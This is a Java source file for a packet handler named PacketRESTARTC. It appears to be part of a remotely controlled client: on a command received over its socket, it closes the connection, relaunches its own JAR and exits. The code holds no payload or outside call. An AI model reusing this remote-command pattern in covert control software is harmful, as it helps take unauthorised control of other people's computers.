package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Util;
import com.redpois0n.common.os.OperatingSystem;

public class PacketRESTARTC extends Packet {

	@Override
	public void read(String line) throws Exception {
		try {

			Connection.socket.close();
		} catch (Exception ex) {
		}
		String javapath = System.getProperty("java.home");
		
		String path = Util.getJarFile().getAbsolutePath();
		
		if (path.startsWith("/") && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			path = path.substring(1, path.length());
		}
		
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { javapath + "\\bin\\javaw.exe", "-jar", path });
		} else {
			Runtime.getRuntime().exec(new String[] { "java", "-jar", path });
		}
		System.exit(0);
	}

}
